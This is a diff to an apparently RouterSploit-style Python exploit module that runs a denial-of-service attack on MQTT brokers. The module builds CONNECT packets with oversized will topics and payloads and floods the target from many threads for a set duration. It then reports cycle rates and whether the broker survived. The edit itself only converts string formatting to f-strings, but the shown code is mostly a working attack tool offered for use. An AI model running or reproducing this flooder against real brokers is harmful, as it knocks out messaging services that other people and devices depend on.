@@ -84,7 +84,7 @@ class Exploit(Exploit):
         flags = 0x06  # clean session + will flag
         keep_alive = struct.pack("!H", 10)
 
-        cid = "wxf-dos-{:04d}".format(seq_id % 10000).encode("utf-8")
+        cid = f"wxf-dos-{seq_id % 10000:04d}".encode()
         client_field = struct.pack("!H", len(cid)) + cid
 
         will_topic = ("dos/" + "A" * (int(self.will_topic_size) - 4)).encode("utf-8")
@@ -160,12 +160,11 @@ class Exploit(Exploit):
 
     @multi
     def run(self):
-        print_status("MQTT DoS → {}:{}".format(self.target, self.port))
-        print_info("{} threads, {} seg, will topic {}B, will payload {}B".format(
-            self.threads, self.duration, self.will_topic_size, self.will_payload_size))
+        print_status(f"MQTT DoS → {self.target}:{self.port}")
+        print_info(f"{self.threads} threads, {self.duration} seg, will topic {self.will_topic_size}B, will payload {self.will_payload_size}B")
 
         if not self.check():
-            print_error("Broker MQTT não acessível em {}:{}".format(self.target, self.port))
+            print_error(f"Broker MQTT não acessível em {self.target}:{self.port}")
             return
 
         print_success("Broker confirmado — iniciando ataque")
@@ -181,7 +180,7 @@ class Exploit(Exploit):
             t.start()
             workers.append(t)
 
-        print_status("Ataque por {} segundos...".format(self.duration))
+        print_status(f"Ataque por {self.duration} segundos...")
         time.sleep(int(self.duration))
         stop_event.clear()
 
@@ -192,7 +191,7 @@ class Exploit(Exploit):
         print_info("  Ciclos CONNECT/DISCONNECT: {}".format(stats["cycles"]))
         print_info("  Erros de conexão: {}".format(stats["errors"]))
         rate = stats["cycles"] / max(int(self.duration), 1)
-        print_info("  Taxa média: {:.1f} ciclos/seg".format(rate))
+        print_info(f"  Taxa média: {rate:.1f} ciclos/seg")
 
         alive = self.check()
         if alive:
